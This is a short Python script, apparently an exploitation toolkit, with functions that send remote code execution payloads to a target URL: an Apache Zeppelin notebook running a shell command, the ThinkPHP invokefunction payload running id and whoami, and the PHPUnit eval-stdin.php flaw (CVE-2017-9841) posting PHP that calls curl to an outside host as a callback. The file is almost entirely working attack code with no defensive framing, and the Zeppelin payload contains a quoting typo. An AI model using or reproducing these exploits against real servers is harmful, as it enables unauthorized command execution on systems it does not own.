import requests
import re





def  zep_cve( target ): #zeppelin 


 h = {'Content-Type': 'application/json'}


 data = {

    "name": "n",


    "paragraphs": [
        {
            "title": "testeteste",
            "text": "%python\nimport os\nos.system(\"whoami)\")"
        }
 
   ]
}



 url =  target + '/api/notebook/'
 resp = requests.post(url ,  json=data , headers=h ,  verify=0)
 r = resp.json()
 job_id = (r.get('body'))
 url = url + 'job/' + job_id
 r = requests.post(url  , headers=h , verify=0)

 print(r.text)


    
  

#############################################





def think_cve( target )  :




   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ; date ; whoami'
   


   target = f"{target}{payload}" 



   print(target)
 

   re =    requests.get(target , verify=0 , timeout=10)
    

   print(re.text)

  





#########################################################################################3


def php_unit( target ) :

#CVE-2017-9841




    payload  =  '<?php  system ("curl http://192.168.1.24:1111/atila_ok"); ?>' 



    target  =  target  + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'

        

     
    r = requests.post(target , data=payload , verify=0, timeout=15)
  


    

  




